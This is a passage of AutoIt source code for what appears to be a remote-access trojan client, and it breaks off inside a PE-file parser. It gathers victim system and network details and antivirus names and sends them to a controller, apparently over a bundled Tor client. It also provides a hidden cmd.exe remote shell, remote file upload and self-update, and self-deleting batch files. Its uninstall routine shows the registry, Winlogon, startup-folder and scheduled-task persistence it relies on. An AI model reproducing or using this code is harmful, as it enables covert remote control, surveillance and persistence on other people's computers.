		$sWanIP = _STUN_GetMyIP()

		$sLocalIP1 = @IPAddress1
		$sLocalIP2 = @IPAddress2
		$sLocalIP3 = @IPAddress3
		$sLocalIP4 = @IPAddress4
		$iAutoItPID = @AutoItPID
		$sAntiVirus = "No Antivirus found" ;not used yet
		$iIdleTime = _Timer_GetIdleTime()

		;generating an simple unique ClientID with a Tag
		_SQLite_QuerySingleRow($hDBConnections, "SELECT SocketID FROM tblConnections WHERE SocketNo = " & $iSocket & ";", $aRow) ;get SocketID from SocketNo
		$sClientIDDriveSnCode =  DriveGetSerial(@HomeDrive)
		$sClientID = $sVersion & "_" &  $sClientTag & "_" & $sClientIDDriveSnCode & $aRow[0];& "_" & $sClientIDInstallPathCode;und install path verwurschteln

		;virusscan start ;not used yet
		If @OSVersion = "WIN_7" Or @OSVersion = "WIN_8" Or @OSVersion = "WIN_81" Or @OSVersion = "WIN_10" Then
			$oWMI = ObjGet("winmgmts:{impersonationLevel=impersonate}!\\.\root\SecurityCenter2")
			$colItems = $oWMI.ExecQuery("Select * from AntiVirusProduct"); " AntiVirusProduct from FirewallProduct" works as well

			For $oAntiVirusProduct In $colItems
				$sAntiVirus = $oAntiVirusProduct.displayName
			Next
		Else
			If @OSVersion = "WIN_XP" Then
				$oWMI = ObjGet("winmgmts:{impersonationLevel=impersonate}!\\.\root\SecurityCenter")
				$colItems = $oWMI.ExecQuery("Select * from AntiVirusProduct"); " AntiVirusProduct from FirewallProduct" works as well

				For $oAntiVirusProduct In $colItems
					$sAntiVirus = $oAntiVirusProduct.displayName
				Next
			EndIf
		EndIf
		;virusscan end

		_Send($iSocket, $sPacketLVInfo & "|" & $sOSLang & "|" & $sWanIP & "|" & $sLocalIP1 & "|" & $sPCName & "|" & $sUserName & "|" & $sOS & "|" & $iIdleTime & "||" & $sClientID & $sPacketDivider & $sFlagNewConnection & $sPacketEND)
	Else ;send only idletime
		$iIdleTime = _Timer_GetIdleTime()
		_Send($iSocket, $sPacketLVInfo & "|||||||" & $iIdleTime & "||" & $sPacketDivider & $sFlagNewConnection & $sPacketEND)
	EndIf
		PingPong("Ping", $iSocket)
EndFunc

Func PingPong($sCompletePacket, $iSocket) ;function to get ping over tor
	Local $aRow
	_SQLite_QuerySingleRow($hDBConnections, "SELECT SocketID FROM tblConnections WHERE SocketNo = " & $iSocket & ";", $aRow) ;get SocketID from SocketNo
	If $sCompletePacket = "Ping" Then
		_Send($iSocket, $sPacketPing & "Ping" & $sPacketEND)
		$hTimerPing[$aRow[0]] = TimerInit()
	EndIf
	If $sCompletePacket = "Pong" Then
		$iPing = TimerDiff($hTimerPing[$aRow[0]])
		$aPing = StringSplit($iPing,".")
		If $aPing[1] < 10 Then
			$iPing = $aPing[1] & "." & StringLeft($aPing[2],2)
		Else
			$iPing = $aPing[1]
		EndIf
		_Send($iSocket, $sPacketLVInfo & "||||||||" & $iPing & "ms" & $sPacketDivider & "False" & $sPacketEND)
	EndIf
EndFunc
#EndRegion Connection functions

#Region FileTransfere functions

Func FileUploading($sCompletePacket, $iSocket)
	;data, ID, RPath, FSize, BSend
	$aCompletePacket = StringSplit($sCompletePacket, $sPacketDivider, 1)
	$dB64BytesRead = $aCompletePacket[1]
	$iUploadID = $aCompletePacket[2]
	$sRemotePath = $aCompletePacket[3]
	If StringInStr($sRemotePath ,"@ScriptDir") Then
		$aRemotePath = StringSplit($sRemotePath, "@ScriptDir", 1)
		$sRemotePath = @ScriptDir & $aRemotePath[2]
	EndIf
	$iFileSize = $aCompletePacket[4]
	$iBytesSend = $aCompletePacket[5]
	$sStatus = $aCompletePacket[6]
	If StringLen($dB64BytesRead) > 1 Then ;This check must be added because _Base64Encode/Decode() will crash the script if it gets empty input.
		;lznt decompress einf�gen
		$dBytesRead = _Base64Decode($dB64BytesRead)

		If $sStatus = "Start" Then
			Assign("hRemoteFile_" & $iUploadID, FileOpen($sRemotePath, 25),2) ;dynamically create global variable for file handle
;~ 			$hRemoteFile = FileOpen($sRemotePath, 25) ;noch ein file exist check machen und anderen dateinamen geben (_001)
			$Result = FileWrite(Eval("hRemoteFile_" & $iUploadID), $dBytesRead)
;~ 			If $Result = 0 Then MsgBox(0,"","Kann nicht schrieben1")
		EndIf
;~ 		FileSetPos($hRemoteFile, $iBytesSend, 0)
		If $sStatus = "Running" Then
			$Result = FileWrite(Eval("hRemoteFile_" & $iUploadID), $dBytesRead)
;~ 			If $Result = 0 Then MsgBox(0,"","Kann nicht schrieben2")
		EndIf
	Else

	EndIf
	If $sStatus = "Completed" Then
		FileClose(Eval("hRemoteFile_" & $iUploadID))
		If FileExists(@ScriptDir & "\Update.exe") Then
			UpdateClient()
		EndIf
	EndIf
	ConsoleWrite(">File Upload. ID: " & $iUploadID & " Socket: " & $iSocket & " RPath: " & $sRemotePath & " FSize: " & $iFileSize & " BSend: " & $iBytesSend & @CRLF)
EndFunc

#EndRegion FileTransfere functions

#Region Contextmenu functions
Func UpdateClient()
	If @Compiled Then
		If FileExists(@ScriptDir & "\update.exe") Then
			Local $sCmdFile
			FileDelete(@TempDir & "\update.bat")
			FileMove(@ScriptFullPath, @ScriptDir & "\old.exe")
	;~ 		FileMove(@ScriptDir & "\update.exe", @ScriptFullPath)
			$sCmdFile = ':loop' & @CRLF _;'ping -n ' & $iDelay & '127.0.0.1 > nul' & @CRLF _
					 & 'del "' & @ScriptDir & "\old.exe" & '"' & @CRLF _
					 & 'if exist "' & @ScriptDir & "\old.exe" & '" goto loop' & @CRLF _
					 & 'del ' & @TempDir & '\update.bat'
			FileWrite(@TempDir & "\update.bat", $sCmdFile)
			Run(@TempDir & "\update.bat", @TempDir, @SW_HIDE) ;TO DO - get pid and processclose it when update fail
	;~ 		Run(@ScriptFullPath)
	;~ 		Run(@ScriptDir & "\update.exe")
			FileMove(@ScriptDir & "\update.exe", @ScriptFullPath)
			Run(@ScriptFullPath)
			If @error Then
				;send failed to run new file not exiting
				;stop delete running bat
				FileMove(@ScriptDir & "\old.exe", @ScriptFullPath)
			Else
				ProcessClose($iTorPID) ;TO DO - noch mit if machen ob tor beenden erfolgreich war
				Sleep(100)
				DirRemove(@ScriptDir & "\TorClient", 1) ;generated from tor.exe
				;delete update.exe
				Local $sCmdFile2
				FileDelete(@TempDir & "\melt2.bat")
				$sCmdFile2 = ':loop' & @CRLF _;'ping -n ' & $iDelay & '127.0.0.1 > nul' & @CRLF _
						 & 'del "' & @ScriptDir & "\update.exe" & '"' & @CRLF _
						 & 'if exist "' & @ScriptDir & "\update.exe" & '" goto loop' & @CRLF _
						 & 'del ' & @TempDir & '\melt2.bat'
				FileWrite(@TempDir & "\melt2.bat", $sCmdFile2)
				Run(@TempDir & "\melt2.bat", @TempDir, @SW_HIDE)
				Exit
			EndIf
		EndIf
	Else
		ConsoleWrite("Need to be a compiled Client.exe to update!" & @CRLF)
	EndIf
EndFunc

Func SystemCMD($sCompletePacket, $iSocket)
	If $sCompletePacket = "CLIENT_RESTART" Then
		ProcessClose($iTorPID)
		Sleep(1000)
		DirRemove(@ScriptDir & "\TorClient", 1) ;generated from tor.exe
		If @Compiled Then
			Run(@AutoItExe) ;working dir wegmachen wenn als system läuft
		Else
			ConsoleWrite("Can not restart cause stub is not a compiled exe." & @CRLF)
		EndIf
		Exit
	EndIf

	If $sCompletePacket = "CLIENT_CLOSE" Then
		ProcessClose($iTorPID)
		Sleep(1000)
		DirRemove(@ScriptDir & "\TorClient", 1) ;generated from tor.exe
		Exit
	EndIf

	If $sCompletePacket = "CLIENT_UNINSTALL" Then
		If $iHKCURun = 1 Then RegDelete("HKCU\SOFTWARE\microsoft\windows\currentversion\run", $sHKCURun)
		If $iHKCULoad = 1 Then RegWrite("HKCU\SOFTWARE\microsoft\windows NT\currentversion\windows", "load", "REG_SZ", "")
		If $iStartupDir = 1 Then FileDelete(@StartupDir & "\" & $sStartupDir)
		If $iTaskScheduler = 1 Then _TaskDelete($sTaskScheduler)

		If IsAdmin() Then
			If $iHKCUPolicies = 1 Then RegDelete("HKCU\SOFTWARE\microsoft\windows\currentversion\Policies\explorer\run", $sHKCUPolicies)
			If $iHKLMPolicies = 1 Then RegDelete("HKLM\SOFTWARE\microsoft\windows\currentversion\Policies\explorer\run", $sHKLMPolicies)
			If $iHKLMActivX = 1 Then
				RegDelete("HKLM\SOFTWARE\microsoft\Active Setup\Installed Components\" & $sHKLMActivX)
				RegDelete("HKCU\SOFTWARE\microsoft\Active Setup\Installed Components\" & $sHKLMActivX)
			EndIf
			If $iHKLMRun = 1 Then RegDelete("HKLM\SOFTWARE\microsoft\windows\currentversion\run", $sHKLMRun)
			If $iHKLMUserInit = 1 Then
				RegWrite("HKLM\SOFTWARE\microsoft\windows NT\currentversion\winlogon", "userinit", "REG_SZ", $sDefaultUserInitKey)
			EndIf
			If $iAllStartupDir = 1 Then FileDelete(@StartupCommonDir & "\" & $sAllStartupDir)
			If $iAdminTaskScheduler = 1 Then _TaskDelete($sAdminTaskScheduler)
		EndIf

		Local $sCmdFile
		FileDelete(@TempDir & "\uninstall.bat")
		$sCmdFile = ':loop' & @CRLF _;'ping -n ' & $iDelay & '127.0.0.1 > nul' & @CRLF _
				 & 'del "' & @ScriptFullPath & '"' & @CRLF _
				 & 'if exist "' & @ScriptFullPath & '" goto loop' & @CRLF _
				 & 'del ' & @TempDir & '\uninstall.bat'
		FileWrite(@TempDir & "\uninstall.bat", $sCmdFile)
		Run(@TempDir & "\uninstall.bat", @TempDir, @SW_HIDE)
;~ 		If $UninstallKeylogger = 1 Then
;~ 			FileClose($klfile)
;~ 			FileDelete($KeyLogPath & "\" & $KeyLogFile)
;~ 		EndIf

		ProcessClose($iTorPID)
		Sleep(1000)
		DirRemove(@ScriptDir & "\TorClient", 1) ;generated from tor.exe
		Exit
	EndIf
EndFunc




Func RemoteShell($sCompletePacket, $iSocket)
	Local $aRow
	_SQLite_QuerySingleRow($hDBConnections, "SELECT SocketID FROM tblConnections WHERE SocketNo = " & $iSocket & ";", $aRow) ;get SocketID from SocketNo
	$aCompletePacket = StringSplit($sCompletePacket, $sPacketDivider, 1)
	For $i = 1 To $aCompletePacket[0]
		Switch $aCompletePacket[$i]
			Case "START_SHELL"
				If $iRemoteShellRunning[$aRow[0]] = 0 Then
					$hTimerRemoteShellRunning[$aRow[0]] = TimerInit()
					StartShell($aRow[0])
				Else
					_ConsoleSendCtrlC($iRemoteShellPID[$aRow[0]])
					ProcessClose($iRemoteShellPID[$aRow[0]]) ;close old existing shell
					$hTimerRemoteShellRunning[$aRow[0]] = TimerInit()
					StartShell($aRow[0]) ;start new shell
				EndIf
			Case "END_SHELL"
				$iRemoteShellRunning[$aRow[0]] = 0
				_ConsoleSendCtrlC($iRemoteShellPID[$aRow[0]])
				ProcessClose($iRemoteShellPID[$aRow[0]])
			Case "CMD"
				If ProcessExists($iRemoteShellPID[$aRow[0]]) Then
					$hTimerRemoteShellRunning[$aRow[0]] = TimerInit()
					$sRemoteShellInput = $aCompletePacket[2]
					If $sRemoteShellInput = "" Then
						$sRemoteShellCommand[$aRow[0]] = @CRLF
					Else
						$sRemoteShellCommand[$aRow[0]] = $sRemoteShellInput & @CRLF
					EndIf
				Else
					;$DataToSend = $CMD_ShellRCV & $end_delimiter & "Shell Closed" & $end_delimiter & $CMD_EndSend
					_Send($iSocket, $sPacketRemoteShell & "Shell Closed" & $sPacketEND)
;~ 					If @error Then
;~ 						Return
;~ 					EndIf
				EndIf
			Case "CTRL_C"
				$hTimerRemoteShellRunning[$aRow[0]] = TimerInit()
				$iRemoteShellCtrlc[$aRow[0]] = 1
		EndSwitch
	Next
EndFunc

Func StartShell($iSocketID)
	$iRemoteShellRunning[$iSocketID] = 1
	$sRemoteShellOutput[$iSocketID] = "" ; Store the output of StdoutRead to a variable.
	$iRemoteShellPID[$iSocketID] = Run(@ComSpec, "", @SW_HIDE, $STDIN_CHILD + $STDOUT_CHILD + $STDERR_CHILD)
;~ 	$iRemoteShellPID[$iSocketID] = Run('powershell.exe -command - ', "", @SW_SHOW, $STDIN_CHILD + $STDOUT_CHILD + $STDERR_CHILD)
	ConsoleWrite("$iRemoteShellPID[$ArraySlotNumber]: " & $iRemoteShellPID[$iSocketID] & @CRLF)
EndFunc

Func RemoteShellLoop()
	Local $aRow
	$i = 0
	_SQLite_Query($hDBConnections, "SELECT SocketNo FROM tblConnections;", $hQueryRemoteShellLoop) ;get SocketNo
	While _SQLite_FetchData($hQueryRemoteShellLoop, $aRow, False, False) = $SQLITE_OK ; Read Out the next Row
			If $aRow[0] = -1 Then ContinueLoop
			If $iRemoteShellRunning[$i] = 1 Then
				If TimerDiff($hTimerRemoteShellRunning[$i]) >= $iRemoteShellAliveCheck[$i] Then
					$iRemoteShellRunning[$i] = 0
					_ConsoleSendCtrlC($iRemoteShellPID[$i])
					ProcessClose($iRemoteShellPID[$i]) ;close shell timeout
					_Send($aRow[0], $sPacketRemoteShell & "Shell Closed (Timeout)" & $sPacketEND)
				Else
					RemoteShellRun($i, $aRow[0])
				EndIf
			EndIf
		$i += 1
	WEnd
	_SQLite_QueryFinalize($hQueryRemoteShellLoop)
EndFunc

Func RemoteShellRun($iSocketID, $iSocket)
	If ProcessExists($iRemoteShellPID[$i]) Then
		$sRemoteShellOutput[$iSocketID] = StdoutRead($iRemoteShellPID[$iSocketID])
		If @error Then ; Exit the loop if the process closes or StdoutRead returns an error.
			$iRemoteShellRunning[$iSocketID] = 0
			Return
		EndIf
		If Not $sRemoteShellOutput[$iSocketID] = "" Then
			$sOutputLen = StringLen($sRemoteShellOutput[$iSocketID])
			If $sOutputLen >= 50000 Then
				$sTempOutput2 = ""
				While 1
					$sTempOutput1 = StringLeft($sRemoteShellOutput[$iSocketID], 50000)
					If $sTempOutput1 = "" Then
						ExitLoop
					EndIf
					$sRemoteShellOutput[$iSocketID] = StringTrimLeft($sRemoteShellOutput[$iSocketID], 50000)
					$sTempOutput2 = $sTempOutput2 & _OEMToAnsi($sTempOutput1)
				WEnd
				$sRemoteShellOutput[$iSocketID] = $sTempOutput2
			Else
				$sRemoteShellOutput[$iSocketID] = _OEMToAnsi($sRemoteShellOutput[$iSocketID])
			EndIf
			;$DataToSend = $CMD_ShellRCV & $end_delimiter & $sOutput[$iSocketID] & $end_delimiter & $CMD_EndSend
			_Send($iSocket, $sPacketRemoteShell & $sRemoteShellOutput[$iSocketID] & $sPacketEND)
;~ 			If @error Then
;~ 				Return
;~ 			EndIf
		EndIf
		Sleep(20)
		$sRemoteShellOutputError[$iSocketID] = StderrRead($iRemoteShellPID[$iSocketID])
		If @error Then ; Exit the loop if the process closes or StdoutRead returns an error.
			$iRemoteShellRunning[$iSocketID] = 0
			Return
		EndIf
		If Not $sRemoteShellOutputError[$iSocketID] = "" Then
			;$sOutputErr[$iSocketID] = _OEMToAnsi($sOutputErr[$iSocketID])
			$sOutputErrLen = StringLen($sRemoteShellOutputError[$iSocketID])
			If $sOutputErrLen >= 50000 Then
				$sTempOutputError2 = ""
				While 1
					$sTempOutputError1 = StringLeft($sRemoteShellOutputError[$iSocketID], 50000)
					If $sTempOutputError1 = "" Then
						ExitLoop
					EndIf
					$sRemoteShellOutputError[$iSocketID] = StringTrimLeft($sRemoteShellOutputError[$iSocketID], 50000)
					$sTempOutputError2 = $sTempOutputError2 & _OEMToAnsi($sTempOutputError1)
				WEnd
				$sRemoteShellOutputError[$iSocketID] = $sTempOutputError2
			Else
				$sRemoteShellOutputError[$iSocketID] = _OEMToAnsi($sRemoteShellOutputError[$iSocketID])
			EndIf
			_Send($iSocket, $sPacketRemoteShell & $sRemoteShellOutputError[$iSocketID] & $sPacketEND)
;~ 			If @error Then
;~ 				Return
;~ 			EndIf
		EndIf
		If $iRemoteShellCtrlc[$iSocketID] = 1 Then
			_ConsoleSendCtrlC($iRemoteShellPID[$iSocketID]) ; geht nur wenn kompiliert
			$iRemoteShellCtrlc[$iSocketID] = 0
		EndIf
		If Not $sRemoteShellCommand[$iSocketID] = "" Then
			$sRemoteShellCommand[$iSocketID] = _AnsiToOEM($sRemoteShellCommand[$iSocketID]) ; ohne splitten in kleine stücke, ich geh davon aus das es keine ewig langen befehle gibt
			StdinWrite($iRemoteShellPID[$iSocketID], $sRemoteShellCommand[$iSocketID]); & @CRLF)
			$sRemoteShellCommand[$iSocketID] = ""
		EndIf
	Else
		$iRemoteShellRunning[$iSocketID] = 0
	EndIf
EndFunc

#EndRegion Contextmenu function

#Region wrapper functions

Func _Send($iSocket,$sDataToSend)
	$sBufferToSend = _WriteBuffer($sDataToSend, $iSocket, "SendBuffer")
	TCPSend($iSocket, $sBufferToSend)
	If @error Then
		$iError = @error
		ConsoleWrite("!> $iSocket: " & $iSocket & "_Send $iError1: " & $iError & @CRLF)
		If $iError <> 10035 Then
			ConsoleWrite("!> $iSocket: " & $iSocket & "_Send $iError2: " & $iError & @CRLF)
			CloseConnection($iSocket)
			Return
		EndIf
	EndIf
	_ClearAndWriteBuffer("", $iSocket, "SendBuffer")
EndFunc

Func _InstallTor()
	DirRemove(@ScriptDir & "\TorClient", 1) ;generated from tor.exe
	DirCreate(@ScriptDir & "\TorClient")
	FileInstall("System\Tor\tor.exe", @ScriptDir & "\TorClient\" & $sTorFileName)
	FileInstall("System\Tor\libeay32.dll", @ScriptDir & "\TorClient\libeay32.dll")
	FileInstall("System\Tor\libevent-2-0-5.dll", @ScriptDir & "\TorClient\libevent-2-0-5.dll")
	FileInstall("System\Tor\libgcc_s_sjlj-1.dll", @ScriptDir & "\TorClient\libgcc_s_sjlj-1.dll")
	FileInstall("System\Tor\ssleay32.dll", @ScriptDir & "\TorClient\ssleay32.dll")
	FileInstall("System\Tor\zlib1.dll", @ScriptDir & "\TorClient\zlib1.dll")
	FileInstall("System\Tor\libssp-0.dll", @ScriptDir & "\TorClient\libssp-0.dll")
EndFunc

Func _ClearAndWriteBuffer($sData, $iSocket, $sWhichBuffer = "RecvBuffer")
	_SQLite_Exec($hDBConnections, "UPDATE tblConnections SET " & $sWhichBuffer & "=" & "'" & $sData & "'" & " WHERE SocketNo = " & $iSocket & ";") ;write RecvBuffer to DB
	Return $sData
EndFunc

Func _WriteBuffer($sData, $iSocket, $sWhichBuffer = "RecvBuffer")
	Local $aRecvBuffer
	_SQLite_QuerySingleRow($hDBConnections, "SELECT " & $sWhichBuffer & " FROM tblConnections WHERE SocketNo = " & $iSocket & ";", $aRecvBuffer) ;get RecvBuffer
	$sBuffer = $aRecvBuffer[0] & $sData
	_SQLite_Exec($hDBConnections, "UPDATE tblConnections SET " & $sWhichBuffer & "=" & "'" & $sBuffer & "'" & " WHERE SocketNo = " & $iSocket & ";") ;write RecvBuffer to DB
	Return $sBuffer
EndFunc

Func _getOSVersion()
    Local $objWMIService = ObjGet("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    Local $colSettings = $objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
    For $objOperatingSystem In $colSettings
        Return StringMid($objOperatingSystem.Caption, 10)
;~ 		Return $objOperatingSystem.Caption
    Next
EndFunc

Func _STUN_GetMyIP()
	; Some STUN servers and their ports
	Local $aServers[14][2] = [["stun.l.google.com", 19302], _
			["stun.ekiga.net", 3478], _
			["stun.sipgate.net", 10000], _
			["stun1.l.google.com", 19302], _
			["stun.ideasip.com", 3478], _
			["stun2.l.google.com", 19302], _
			["stunserver.org", 3478], _
			["stun3.l.google.com", 19302], _
			["stun.rixtelecom.se", 3478], _
			["stun4.l.google.com", 19302], _
			["stun.schlund.de", 3478], _
			["stun.voiparound.com", 3478], _
			["stun.voipbuster.com", 3478], _
			["stun.voipstunt.com", 3478]]

	Local Const $MAPPED_ADDRESS = 0x0001 ; interested in this info
	Local Const $IPv4 = 0x01 ; IPv4 format
	Local Const $IPv6 = 0x02 ; IPv6 format

	; Generate request
	Local $bRandom12 = _STUN_GenerateRandom12() ; some random unique ID in size of 12 bytes
	; Binding request has class=0x00 and  method=0x000000000001 (Binding) and is encoded into the first two bytes as 0x0001. Check http://tools.ietf.org/html/rfc5389#section-15
	Local $bBinary = Binary("0x0001000000000000") & $bRandom12

	Local $sIpServ, $aSocket, $bRcvData
;~ 	UDPStartup()
	For $i = 0 To UBound($aServers) - 1
		$sIpServ = TCPNameToIP($aServers[$i][0])
		If @error Then ContinueLoop ; couldn't resolve server's IP
		$aSocket = UDPOpen($sIpServ, $aServers[$i][1])
		UDPSend($aSocket, $bBinary)
		For $j = 1 To 3 ; read few (e.g. three) times if necessary
			$bRcvData = UDPRecv($aSocket, 1280) ; never more than 1280 bytes can be returned by the server. Usually it's 50-something bytes.
			If @error Then ExitLoop ; e.g. firewall rule blocks
			If $bRcvData Then ExitLoop 2 ; successfully read, get out of the loops
			Sleep(10) ; give it time to process
		Next
		UDPCloseSocket($aSocket)
	Next
	UDPCloseSocket($aSocket)
;~ 	UDPShutdown()
	#cs
		; Struct can be written now in place of binary data, but it's all big-endian (weird for reading in AutoIt):
		Local $tSTUN = DllStructCreate("byte Header_[8]; byte Header_ID[12];" & _
		"byte Type[2];" & _
		"byte Length[2];" & _
		"byte Attrib;" & _
		"byte Family;" & _
		"byte Port[2];" & _
		"byte IP[4];")
	#ce
	; ...so I will just parse binary directly instead.
	Local $iSizeData = BinaryLen($bRcvData)
	If $iSizeData Then ; sanity check
		Local $bReadID = BinaryMid($bRcvData, 9, 12) ; server returns my unique "ID"
		Local $iType, $iLength = 0
		Local $iPos = 21 ; further parsing starts after the header, see the struct and STUN doc

		If $bReadID = $bRandom12 Then ; check validity of the response by checking returned ID (handle)
			While $iPos < $iSizeData
				$iType = _STUN_Read_BE_Bin(BinaryMid($bRcvData, $iPos, 2))
				$iPos += 2 ; skip the size of "Type" field
				$iLength = _STUN_Read_BE_Bin(BinaryMid($bRcvData, $iPos, 2))
				$iPos += 2 ; skip the size of "Length" field
				If $iType = $MAPPED_ADDRESS Then ExitLoop
				$iPos += $iLength ; skip the size of all of the data in this chunk
			WEnd
		EndIf
		$iPos += 1 ; skip the size of "Attrib" field
		Local $iFamily = _STUN_Read_BE_Bin(BinaryMid($bRcvData, $iPos, 1)) ; read "Family" info.
		$iPos += 1 ; skip the size of "Family" field
		$iPos += 2 ; skip the size of "Port" field

		If $iFamily = $IPv4 Then
			; Read IP info. Four bytes are IP in network byte order (big endian)
			Return Int(BinaryMid($bRcvData, $iPos, 1)) & "." & Int(BinaryMid($bRcvData, $iPos + 1, 1)) & "." & Int(BinaryMid($bRcvData, $iPos + 2, 1)) & "." & Int(BinaryMid($bRcvData, $iPos + 3, 1))
		ElseIf $iFamily = $IPv6 Then
			; IPv6 - you do it, I'll just return error:
			Return SetError(1, 0, ":::::::")
		EndIf
		; No such data available
		Return SetError(2, 0, "")
	EndIf
	; You are blocked or something
	Return SetError(3, 0, "")
EndFunc

Func _STUN_Read_BE_Bin($bBinary)
	; Big endian to number
	Return Dec(Hex($bBinary))
EndFunc

Func _STUN_GenerateRandom12()
	; Whatever
	Return BinaryMid(BinaryMid(Binary(Random(1.1, 2 ^ 31 - 1)), 1, 6) & Binary(Random(1.1, 2 ^ 31 - 1)), 1, 12)
EndFunc

Func _HighPrecisionSleep($iMicroSeconds,$hDll=False)
    Local $hStruct, $bLoaded
    If Not $hDll Then
        $hDll=DllOpen("ntdll.dll")
        $bLoaded=True
    EndIf
    $hStruct=DllStructCreate("int64 time;")
    DllStructSetData($hStruct,"time",-1*($iMicroSeconds*10))
    DllCall($hDll,"dword","ZwDelayExecution","int",0,"ptr",DllStructGetPtr($hStruct))
    If $bLoaded Then DllClose($hDll)
EndFunc

Func _ConsoleSendCtrlC($iPID, $iLoop = 1, $iSlp = 10, $iDll = "kernel32.dll")
	;Author: rover 2k12
	Local $aRet = DllCall($iDll, "bool", "AttachConsole", "dword", $iPID)
	If @error Or $aRet[0] = 0 Then Return SetError(1, 0, -1)
	Local $iRet = 1, $iExt = -1, $iCnt = 0
	;check params
	$iLoop = Int($iLoop)
	If $iLoop < 1 Then $iLoop = 1
	$iSlp = Int($iSlp)
	If $iSlp < 10 Then $iSlp = 10
	$aRet = DllCall($iDll, "bool", "SetConsoleCtrlHandler", "ptr", 0, "bool", 1)
	If @error Or $aRet[0] = 0 Then
		DllCall($iDll, "bool", "FreeConsole")
		Return SetError(2, 0, -1)
	EndIf
	;Send SIGINT, free console and reset Ctrl+C blocking
	Do
		$aRet = DllCall($iDll, "bool", "GenerateConsoleCtrlEvent", "dword", 0, "dword", 0)
		If @error Or $aRet[0] = 0 Then $iRet = -1
		$iCnt += 1
		Sleep($iSlp)
	Until $iCnt = $iLoop Or ProcessExists($iPID) = 0
	$aRet = DllCall($iDll, "bool", "FreeConsole")
	If Not @error Then $iExt = $aRet[0]
	$aRet = DllCall($iDll, "bool", "SetConsoleCtrlHandler", "ptr", 0, "bool", 0)
	If @error Or $aRet[0] = 0 Then Return SetError(3, $iExt, $iRet)
	Return SetError(4, $iExt, $iRet)
EndFunc

Func _PEFileGetOverlayInfo($sPEFile)
;~ 	If Not FileExists($sPEFile) Then Return SetError(1,0,0)
	Local $hFile, $nFileSize, $bBuffer, $iOffset, $iErr, $iExit, $aRet[5] = [0, 0, 0, 0]
	Local $nTemp, $nSections, $nDataDirectories, $nLastSectionOffset, $nLastSectionSz
	Local $iSucces = 0, $iCertificateAddress = 0, $nCertificateSz = 0, $stEndian = DllStructCreate("int")

	$nFileSize = FileGetSize($sPEFile)
	$hFile = FileOpen($sPEFile, 16)
	If $hFile = -1 Then Return SetError(-1, 0, $aRet)

	; A once-only loop helps where "goto's" would be helpful
	Do
		; We keep different exit codes for different operations in case of failure (easier to track down what failed)
		;	The function can be altered to remove these assignments of course
		$iExit = -2
		$bBuffer = FileRead($hFile, 2)
		If @error Then ExitLoop

		$iExit = 2
;~ 	'MZ' in hex (endian-swapped):
		If $bBuffer <> 0x5A4D Then ExitLoop
		;ConsoleWrite("MZ Signature found:"&BinaryToString($bBuffer)&@CRLF)

		$iExit = -3
;~ 	Move to Windows PE Signature Offset location
		If Not FileSetPos($hFile, 0x3C, 0) Then ExitLoop

		$iExit = -2
		$bBuffer = FileRead($hFile, 4)
		If @error Then ExitLoop

		$iOffset = Number($bBuffer) ; Though the data is in little-endian, because its a binary variant, the conversion works
		;ConsoleWrite("Offset to Windows PE Header="&$iOffset&@CRLF)

		$iExit = -3
;~ 	Move to Windows PE Header Offset
		If Not FileSetPos($hFile, $iOffset, 0) Then ExitLoop

		$iExit = -2
;~ 	Read in IMAGE_FILE_HEADER + Magic Number
		$bBuffer = FileRead($hFile, 26)
		If @error Then ExitLoop

		$iExit = 3
		; "PE/0/0" in hex (endian swapped)
		If BinaryMid($bBuffer, 1, 4) <> 0x00004550 Then ExitLoop

		; Get NumberOfSections (need to use endian conversion)
		DllStructSetData($stEndian, 1, BinaryMid($bBuffer, 6 + 1, 2))
		$nSections = DllStructGetData($stEndian, 1)
		; Sanity check
		If $nSections * 40 > $nFileSize Then ExitLoop
;~ 		ConsoleWrite("# of Sections: " & $nSections & @CRLF)

		$bBuffer = BinaryMid($bBuffer, 24 + 1, 2)

		; Magic Number check (0x10B = PE32, 0x107 = ROM image, 0x20B = PE32+ (x64)
		If $bBuffer = 0x10B Then
			; Adjust offset to where "NumberOfRvaAndSizes" is on PE32 (offset from IMAGE_FILE_HEADER)
			$iOffset += 116
		ElseIf $bBuffer = 0x20B Then
			; Adjust offset to where "NumberOfRvaAndSizes" is on PE32+ (offset from IMAGE_FILE_HEADER)
			$iOffset += 132
		Else
			$iExit = 4
			SetError(Number($bBuffer)) ; Set the error (picked up below and set in @extended) to the unrecognized Number found
			ExitLoop
		EndIf

;~ 	'Optional' Header Windows-Specific fields

		$iExit = -3
;~ 	-> Move to "NumberOfRvaAndSizes" at the end of IMAGE_OPTIONAL_HEADER
		If Not FileSetPos($hFile, $iOffset, 0) Then ExitLoop

		$iExit = -2
;~ 	Read in NumberOfRvaAndSizes
		$nDataDirectories = Number(FileRead($hFile, 4))
		; Sanity and error check
		If $nDataDirectories <= 0 Or $nDataDirectories > 16 Then ExitLoop

;~ 		ConsoleWrite("# of IMAGE_DATA_DIRECTORY's: " & $nDataDirectories & @CRLF)

;~ 	Read in IMAGE_DATA_DIRECTORY's (also moves file position to IMAGE_SECTION_HEADER)
		$bBuffer = FileRead($hFile, $nDataDirectories * 8)
		If @error Then ExitLoop

;~ 	IMAGE_DIRECTORY_ENTRY_SECURITY entry is special - it's "VirtualAddress" is actually a file offset
		If $nDataDirectories >= 5 Then
			DllStructSetData($stEndian, 1, BinaryMid($bBuffer, 4 * 8 + 1, 4))
			$iCertificateAddress = DllStructGetData($stEndian, 1)
			DllStructSetData($stEndian, 1, BinaryMid($bBuffer, 4 * 8 + 4 + 1, 4))
			$nCertificateSz = DllStructGetData($stEndian, 1)
			If $iCertificateAddress Then ConsoleWrite("Certificate Table address found, offset = " & $iCertificateAddress & ", size = " & $nCertificateSz & @CRLF)
		EndIf

		; Read in ALL sections
		$bBuffer = FileRead($hFile, $nSections * 40)
		If @error Then ExitLoop

;~ 	DONE Reading File info..

		; Now to traverse the sections..

		; $iOffset Now refers to the location within the binary data
		$iOffset = 1
		$nLastSectionOffset = 0
		$nLastSectionSz = 0
		For $i = 1 To $nSections
			; Within IMAGE_SECTION_HEADER: RawDataPtr = offset 20, SizeOfRawData = offset 16
			DllStructSetData($stEndian, 1, BinaryMid($bBuffer, $iOffset + 20, 4))
			$nTemp = DllStructGetData($stEndian, 1)
			;ConsoleWrite("RawDataPtr, iteration #"&$i&" = " & $nTemp & @CRLF)
			; Is it further than last section offset?
			;  AND - check here for rare situation where section Offset may be outside Filesize bounds
			If $nTemp > $nLastSectionOffset And $nTemp < $nFileSize Then
				$nLastSectionOffset = $nTemp
